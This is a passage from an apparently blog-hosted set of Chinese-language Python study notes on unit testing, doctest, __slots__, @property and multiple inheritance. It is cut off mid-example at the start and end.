d.empty</span><br></pre></td></tr></table></figure><h3 id="8-3-1-运行单元测试"><a href="#8-3-1-运行单元测试" class="headerlink" title="8.3.1 运行单元测试"></a>8.3.1 运行单元测试</h3><p>一旦编写好单元测试，我们就可以运行单元测试。最简单的运行方式是在<code>mydict_test.py</code>的最后加上两行代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure><p>这样就可以把<code>mydict_test.py</code>当做正常的python脚本运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python mydict_test.py</span><br></pre></td></tr></table></figure><p>另一种方法是在命令行通过参数<code>-m unittest</code>直接运行单元测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python -m unittest mydict_test</span><br><span class="line">.....</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 5 tests in 0.000s</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>这是推荐的做法，因为这样可以一次批量运行很多单元测试，并且，有很多工具可以自动来运行这些单元测试。</p><h3 id="8-3-2-setUp-与-tearDown"><a href="#8-3-2-setUp-与-tearDown" class="headerlink" title="8.3.2 setUp 与 tearDown"></a>8.3.2 setUp 与 tearDown</h3><p>可以在单元测试中编写两个特殊的<code>setUp()</code>和<code>tearDown()</code>方法。这两个方法会分别在每调用一个测试方法的前后分别被执行。</p><p><code>setUp()</code>和<code>tearDown()</code>方法有什么用呢？设想你的测试需要启动一个数据库，这时，就可以在<code>setUp()</code>方法中连接数据库，在<code>tearDown()</code>方法中关闭数据库，这样，不必在每个测试方法中重复相同的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class TestDict(unittest.TestCase):</span><br><span class="line"></span><br><span class="line">    def setUp(self):</span><br><span class="line">        print(&#x27;setUp...&#x27;)</span><br><span class="line"></span><br><span class="line">    def tearDown(self):</span><br><span class="line">        print(&#x27;tearDown...&#x27;)</span><br></pre></td></tr></table></figure><p>可以再次运行测试看看每个测试方法调用前后是否会打印出<code>setUp...</code>和<code>tearDown...</code>。</p><blockquote><p>小结：</p></blockquote><ul><li>单元测试可以有效地测试某个程序模块的行为，是未来重构代码的信心保证。</li><li>单元测试的测试用例要覆盖常用的输入组合、边界条件和异常。</li><li>单元测试代码要非常简单，如果测试代码太复杂，那么测试代码本身就可能有bug。</li><li>单元测试通过了并不意味着程序就没有bug了，但是不通过程序肯定有bug。</li></ul><h2 id="8-4-文档测试"><a href="#8-4-文档测试" class="headerlink" title="8.4 文档测试"></a>8.4 文档测试</h2><p>如果你经常阅读Python的官方文档，可以看到很多文档都有示例代码。比如<a href="https://docs.python.org/3/library/re.html">re模块</a>就带了很多示例代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; m = re.search(&#x27;(?&lt;=abc)def&#x27;, &#x27;abcdef&#x27;)</span><br><span class="line">&gt;&gt;&gt; m.group(0)</span><br><span class="line">&#x27;def&#x27;</span><br></pre></td></tr></table></figure><p>可以把这些示例代码在Python的交互式环境下输入并执行，结果与文档中的示例代码显示的一致。</p><p>这些代码与其他说明可以写在注释中，然后，由一些工具来自动生成文档。既然这些代码本身就可以粘贴出来直接运行，那么，可不可以自动执行写在注释中的这些代码呢？</p><p>答案是肯定的。</p><p>当我们编写注释时，如果写上这样的注释：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def abs(n):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    Function to get absolute value of number.</span><br><span class="line">    </span><br><span class="line">    Example:</span><br><span class="line">    </span><br><span class="line">    &gt;&gt;&gt; abs(1)</span><br><span class="line">    1</span><br><span class="line">    &gt;&gt;&gt; abs(-1)</span><br><span class="line">    1</span><br><span class="line">    &gt;&gt;&gt; abs(0)</span><br><span class="line">    0</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    return n if n &gt;= 0 else (-n)</span><br></pre></td></tr></table></figure><p>无疑更明确地告诉函数的调用者该函数的期望输入和输出。</p><p>并且，Python内置的“文档测试”（doctest）模块可以直接提取注释中的代码并执行测试。</p><p>doctest严格按照Python交互式命令行的输入和输出来判断测试结果是否正确。只有测试异常的时候，可以用<code>...</code>表示中间一大段烦人的输出。</p><p>让我们用doctest来测试上次编写的<code>Dict</code>类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"># mydict2.py</span><br><span class="line">class Dict(dict):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    Simple dict but also support access as x.y style.</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; d1 = Dict()</span><br><span class="line">    &gt;&gt;&gt; d1[&#x27;x&#x27;] = 100</span><br><span class="line">    &gt;&gt;&gt; d1.x</span><br><span class="line">    100</span><br><span class="line">    &gt;&gt;&gt; d1.y = 200</span><br><span class="line">    &gt;&gt;&gt; d1[&#x27;y&#x27;]</span><br><span class="line">    200</span><br><span class="line">    &gt;&gt;&gt; d2 = Dict(a=1, b=2, c=&#x27;3&#x27;)</span><br><span class="line">    &gt;&gt;&gt; d2.c</span><br><span class="line">    &#x27;3&#x27;</span><br><span class="line">    &gt;&gt;&gt; d2[&#x27;empty&#x27;]</span><br><span class="line">    Traceback (most recent call last):</span><br><span class="line">        ...</span><br><span class="line">    KeyError: &#x27;empty&#x27;</span><br><span class="line">    &gt;&gt;&gt; d2.empty</span><br><span class="line">    Traceback (most recent call last):</span><br><span class="line">        ...</span><br><span class="line">    AttributeError: &#x27;Dict&#x27; object has no attribute &#x27;empty&#x27;</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    def __init__(self, **kw):</span><br><span class="line">        super(Dict, self).__init__(**kw)</span><br><span class="line"></span><br><span class="line">    def __getattr__(self, key):</span><br><span class="line">        try:</span><br><span class="line">            return self[key]</span><br><span class="line">        except KeyError:</span><br><span class="line">            raise AttributeError(r&quot;&#x27;Dict&#x27; object has no attribute &#x27;%s&#x27;&quot; % key)</span><br><span class="line"></span><br><span class="line">    def __setattr__(self, key, value):</span><br><span class="line">        self[key] = value</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    import doctest</span><br><span class="line">    doctest.testmod()</span><br></pre></td></tr></table></figure><p>运行<code>python mydict2.py</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python mydict2.py</span><br></pre></td></tr></table></figure><p>什么输出也没有。这说明我们编写的doctest运行都是正确的。如果程序有问题，比如把<code>__getattr__()</code>方法注释掉，再运行就会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ python mydict2.py</span><br><span class="line">**********************************************************************</span><br><span class="line">File &quot;/Users/michael/Github/learn-python3/samples/debug/mydict2.py&quot;, line 10, in __main__.Dict</span><br><span class="line">Failed example:</span><br><span class="line">    d1.x</span><br><span class="line">Exception raised:</span><br><span class="line">    Traceback (most recent call last):</span><br><span class="line">      ...</span><br><span class="line">    AttributeError: &#x27;Dict&#x27; object has no attribute &#x27;x&#x27;</span><br><span class="line">**********************************************************************</span><br><span class="line">File &quot;/Users/michael/Github/learn-python3/samples/debug/mydict2.py&quot;, line 16, in __main__.Dict</span><br><span class="line">Failed example:</span><br><span class="line">    d2.c</span><br><span class="line">Exception raised:</span><br><span class="line">    Traceback (most recent call last):</span><br><span class="line">      ...</span><br><span class="line">    AttributeError: &#x27;Dict&#x27; object has no attribute &#x27;c&#x27;</span><br><span class="line">**********************************************************************</span><br><span class="line">1 items had failures:</span><br><span class="line">   2 of   9 in __main__.Dict</span><br><span class="line">***Test Failed*** 2 failures.</span><br></pre></td></tr></table></figure><p>注意到最后3行代码。当模块正常导入时，doctest不会被执行。只有在命令行直接运行时，才执行doctest。所以，不必担心doctest会在非测试环境下执行。</p><blockquote><p>小结：</p></blockquote><p>doctest非常有用，不但可以用来测试，还可以直接作为示例代码。通过某些文档生成工具，就可以自动把包含doctest的注释提取出来。用户看文档的时候，同时也看到了doctest。</p><h2 id="8-5-参考资料"><a href="#8-5-参考资料" class="headerlink" title="8.5 参考资料"></a>8.5 参考资料</h2><ul><li><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017598814713792">廖雪峰 - Python 3.x - 错误、调试和测试</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 测试 </tag>
            
            <tag> 调试 </tag>
            
            <tag> 错误 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习笔记(七)·面向对象高级编程</title>
      <link href="/100.html"/>
      <url>/100.html</url>
      
        <content type="html"><![CDATA[<p>数据封装、继承和多态只是面向对象程序设计中最基础的 3 个概念。在 Python 中，面向对象还有很多高级特性，允许我们写出非常强大的功能。</p><p>我们会讨论多重继承、定制类、元类等概念。</p><h2 id="7-1-使用-slots"><a href="#7-1-使用-slots" class="headerlink" title="7.1 使用 __slots__"></a>7.1 使用 <code>__slots__</code></h2><p>正常情况下，当我们定义了一个 class，创建了一个 class 的实例后，我们可以给该实例绑定任何<code>属性</code>和<code>方法</code>，这就是动态语言的灵活性。先定义 class：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>然后，尝试给实例绑定一个属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = Student()</span><br><span class="line">&gt;&gt;&gt; s.name = &#x27;Michael&#x27; # 动态给实例绑定一个属性</span><br><span class="line">&gt;&gt;&gt; print(s.name)</span><br><span class="line">Michael</span><br></pre></td></tr></table></figure><p>还可以尝试给实例绑定一个方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def set_age(self, age): # 定义一个函数作为实例方法</span><br><span class="line">...     self.age = age</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; from types import MethodType</span><br><span class="line">&gt;&gt;&gt; s.set_age = MethodType(set_age, s) # 给实例绑定一个方法</span><br><span class="line">&gt;&gt;&gt; s.set_age(25) # 调用实例方法</span><br><span class="line">&gt;&gt;&gt; s.age # 测试结果</span><br><span class="line">25</span><br></pre></td></tr></table></figure><p>但是，给一个实例绑定的方法，对另一个实例是不起作用的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s2 = Student() # 创建新的实例</span><br><span class="line">&gt;&gt;&gt; s2.set_age(25) # 尝试调用方法</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: &#x27;Student&#x27; object has no attribute &#x27;set_age&#x27;</span><br></pre></td></tr></table></figure><p>为了给所有实例都绑定方法，可以给 class 绑定方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def set_score(self, score):</span><br><span class="line">...     self.score = score</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; Student.set_score = set_score</span><br></pre></td></tr></table></figure><p>给 class 绑定方法后，所有实例均可调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.set_score(100)</span><br><span class="line">&gt;&gt;&gt; s.score</span><br><span class="line">100</span><br><span class="line">&gt;&gt;&gt; s2.set_score(99)</span><br><span class="line">&gt;&gt;&gt; s2.score</span><br><span class="line">99</span><br></pre></td></tr></table></figure><p>通常情况下，上面的<code>set_score</code>方法可以直接定义在 class 中，但动态绑定允许我们在程序运行的过程中动态给 class 加上功能，这在静态语言中很难实现。</p><p>但是，如果我们想要限制实例的属性怎么办？比如，只允许对 Student 实例添加<code>name</code>和<code>age</code>属性。</p><p>为了达到限制的目的，Python 允许在定义 class 的时候，定义一个特殊的<code>__slots__</code>变量，来限制该 class 实例能添加的属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    __slots__ = (&#x27;name&#x27;, &#x27;age&#x27;) # 用tuple定义允许绑定的属性名称</span><br></pre></td></tr></table></figure><p>然后，我们试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = Student() # 创建新的实例</span><br><span class="line">&gt;&gt;&gt; s.name = &#x27;Michael&#x27; # 绑定属性&#x27;name&#x27;</span><br><span class="line">&gt;&gt;&gt; s.age = 25 # 绑定属性&#x27;age&#x27;</span><br><span class="line">&gt;&gt;&gt; s.score = 99 # 绑定属性&#x27;score&#x27;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: &#x27;Student&#x27; object has no attribute &#x27;score&#x27;</span><br></pre></td></tr></table></figure><p>由于<code>&#39;score&#39;</code>没有被放到<code>__slots__</code>中，所以不能绑定<code>score</code>属性，试图绑定<code>score</code>将得到<code>AttributeError</code>的错误。</p><p>使用<code>__slots__</code>要注意，<code>__slots__</code>定义的属性仅对当前类实例起作用，对继承的子类是不起作用的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class GraduateStudent(Student):</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; g = GraduateStudent()</span><br><span class="line">&gt;&gt;&gt; g.score = 9999</span><br></pre></td></tr></table></figure><p>除非在子类中也定义<code>__slots__</code>，这样，子类实例允许定义的属性就是自身的<code>__slots__</code>加上父类的<code>__slots__</code>。</p><h2 id="7-2-使用-property"><a href="#7-2-使用-property" class="headerlink" title="7.2 使用 @property"></a>7.2 使用 @property</h2><p>在绑定属性时，如果我们直接把属性暴露出去，虽然写起来很简单，但是，没办法检查参数，导致可以把成绩随便改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = Student()</span><br><span class="line">s.score = 9999</span><br></pre></td></tr></table></figure><p>这显然不合逻辑。为了限制 score 的范围，可以通过一个<code>set_score()</code>方法来设置成绩，再通过一个<code>get_score()</code>来获取成绩，这样，在<code>set_score()</code>方法里，就可以检查参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line"></span><br><span class="line">    def get_score(self):</span><br><span class="line">         return self._score</span><br><span class="line"></span><br><span class="line">    def set_score(self, value):</span><br><span class="line">        if not isinstance(value, int):</span><br><span class="line">            raise ValueError(&#x27;score must be an integer!&#x27;)</span><br><span class="line">        if value &lt; 0 or value &gt; 100:</span><br><span class="line">            raise ValueError(&#x27;score must between 0 ~ 100!&#x27;)</span><br><span class="line">        self._score = value</span><br></pre></td></tr></table></figure><p>现在，对任意的 Student 实例进行操作，就不能随心所欲地设置 score 了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = Student()</span><br><span class="line">&gt;&gt;&gt; s.set_score(60) # ok!</span><br><span class="line">&gt;&gt;&gt; s.get_score()</span><br><span class="line">60</span><br><span class="line">&gt;&gt;&gt; s.set_score(9999)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">ValueError: score must between 0 ~ 100!</span><br></pre></td></tr></table></figure><p>但是，上面的调用方法又略显复杂，没有直接用属性这么直接简单。</p><p>有没有既能检查参数，又可以用类似属性这样简单的方式来访问类的变量呢？对于追求完美的 Python 程序员来说，这是必须要做到的！</p><p>还记得装饰器（decorator）可以给函数动态加上功能吗？对于类的方法，装饰器一样起作用。Python 内置的<code>@property</code>装饰器就是负责把一个方法变成属性调用的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    def score(self):</span><br><span class="line">        return self._score</span><br><span class="line"></span><br><span class="line">    @score.setter</span><br><span class="line">    def score(self, value):</span><br><span class="line">        if not isinstance(value, int):</span><br><span class="line">            raise ValueError(&#x27;score must be an integer!&#x27;)</span><br><span class="line">        if value &lt; 0 or value &gt; 100:</span><br><span class="line">            raise ValueError(&#x27;score must between 0 ~ 100!&#x27;)</span><br><span class="line">        self._score = value</span><br></pre></td></tr></table></figure><p><code>@property</code>的实现比较复杂，我们先考察如何使用。把一个 getter 方法变成属性，只需要加上<code>@property</code>就可以了，此时，<code>@property</code>本身又创建了另一个装饰器<code>@score.setter</code>，负责把一个 setter 方法变成属性赋值，于是，我们就拥有一个可控的属性操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = Student()</span><br><span class="line">&gt;&gt;&gt; s.score = 60 # OK，实际转化为s.set_score(60)</span><br><span class="line">&gt;&gt;&gt; s.score # OK，实际转化为s.get_score()</span><br><span class="line">60</span><br><span class="line">&gt;&gt;&gt; s.score = 9999</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">ValueError: score must between 0 ~ 100!</span><br></pre></td></tr></table></figure><p>注意到这个神奇的<code>@property</code>，我们在对实例属性操作的时候，就知道该属性很可能不是直接暴露的，而是通过 getter 和 setter 方法来实现的。</p><p>还可以定义只读属性，只定义 getter 方法，不定义 setter 方法就是一个只读属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    def birth(self):</span><br><span class="line">        return self._birth</span><br><span class="line"></span><br><span class="line">    @birth.setter</span><br><span class="line">    def birth(self, value):</span><br><span class="line">        self._birth = value</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    def age(self):</span><br><span class="line">        return 2015 - self._birth</span><br></pre></td></tr></table></figure><p>上面的<code>birth</code>是可读写属性，而<code>age</code>就是一个只读属性，因为<code>age</code>可以根据<code>birth</code>和当前时间计算出来。</p><blockquote><p>小结：</p></blockquote><p><code>@property</code>广泛应用在类的定义中，可以让调用者写出简短的代码，同时保证对参数进行必要的检查，这样，程序运行时就减少了出错的可能性。</p><blockquote><p>练习：</p></blockquote><p>请利用<code>@property</code>给一个<code>Screen</code>对象加上<code>width</code>和<code>height</code>属性，以及一个只读属性<code>resolution</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">class Screen(object):</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line"></span><br><span class="line">    def width(self):</span><br><span class="line"></span><br><span class="line">        return self._width</span><br><span class="line"></span><br><span class="line">    @width.setter</span><br><span class="line"></span><br><span class="line">    def width(self, value):</span><br><span class="line"></span><br><span class="line">        if not isinstance(value, (int, float)):</span><br><span class="line"></span><br><span class="line">            raise ValueError(&#x27;width must be an number!&#x27;)</span><br><span class="line"></span><br><span class="line">        if value &lt; 0 :</span><br><span class="line"></span><br><span class="line">            raise ValueError(&#x27;width must &gt; 0&#x27;)</span><br><span class="line"></span><br><span class="line">        self._width = value</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line"></span><br><span class="line">    def height(self):</span><br><span class="line"></span><br><span class="line">        return self._height</span><br><span class="line"></span><br><span class="line">    @height.setter</span><br><span class="line"></span><br><span class="line">    def height(self, value):</span><br><span class="line"></span><br><span class="line">        if not isinstance(value, (int, float)):</span><br><span class="line"></span><br><span class="line">            raise ValueError(&#x27;height must be an number!&#x27;)</span><br><span class="line"></span><br><span class="line">        if value &lt; 0 :</span><br><span class="line"></span><br><span class="line">            raise ValueError(&#x27;height must &gt; 0&#x27;)</span><br><span class="line"></span><br><span class="line">        self._height = value</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line"></span><br><span class="line">    def resolution(self):</span><br><span class="line"></span><br><span class="line">        return self._height * self._width</span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 测试:</span><br><span class="line">s = Screen()</span><br><span class="line">s.width = 1024</span><br><span class="line">s.height = 768</span><br><span class="line">print(&#x27;resolution =&#x27;, s.resolution)</span><br><span class="line">if s.resolution == 786432:</span><br><span class="line">    print(&#x27;测试通过!&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;测试失败!&#x27;)</span><br></pre></td></tr></table></figure><h2 id="7-3-多重继承"><a href="#7-3-多重继承" class="headerlink" title="7.3 多重继承"></a>7.3 多重继承</h2><p>继承是面向对象编程的一个重要的方式，因为通过继承，子类就可以扩展父类的功能。</p><p>回忆一下<code>Animal</code>类层次的设计，假设我们要实现以下 4 种动物：</p><ul><li>Dog - 狗狗；</li><li>Bat - 蝙蝠；</li><li>Parrot - 鹦鹉；</li><li>Ostrich - 鸵鸟。</li></ul><p>如果按照哺乳动物和鸟类归类，我们可以设计出这样的类的层次：</p><p><img src="https://cos.gjcloak.xyz/pigo/202207201454018.png?imageMogr2/format/webp/interlace/1/quality/80" alt="归类" title="归类"></p><p>但是如果按照“能跑”和“能飞”来归类，我们就应该设计出这样的类的层次：</p><p><img src="https://cos.gjcloak.xyz/pigo/202207201455962.png?imageMogr2/format/webp/interlace/1/quality/80" alt="归类" title="归类"></p><p>如果要把上面的两种分类都包含进来，我们就得设计更多的层次：</p><ul><li>哺乳类：能跑的哺乳类，能飞的哺乳类；</li><li>鸟类：能跑的鸟类，能飞的鸟类。</li></ul><p>这么一来，类的层次就复杂了：</p><p><img src="https://cos.gjcloak.xyz/pigo/202207201457936.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-20200811111248510" title="image-20200811111248510"></p><p>如果要再增加“宠物类”和“非宠物类”，这么搞下去，类的数量会呈指数增长，很明显这样设计是不行的。</p><p>正确的做法是采用多重继承。首先，主要的类层次仍按照哺乳类和鸟类设计：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class Animal(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"># 大类:</span><br><span class="line">class Mammal(Animal):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class Bird(Animal):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"># 各种动物:</span><br><span class="line">class Dog(Mammal):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class Bat(Mammal):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class Parrot(Bird):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class Ostrich(Bird):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>现在，我们要给动物再加上<code>Runnable</code>和<code>Flyable</code>的功能，只需要先定义好<code>Runnable</code>和<code>Flyable</code>的类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Runnable(object):</span><br><span class="line">    def run(self):</span><br><span class="line">        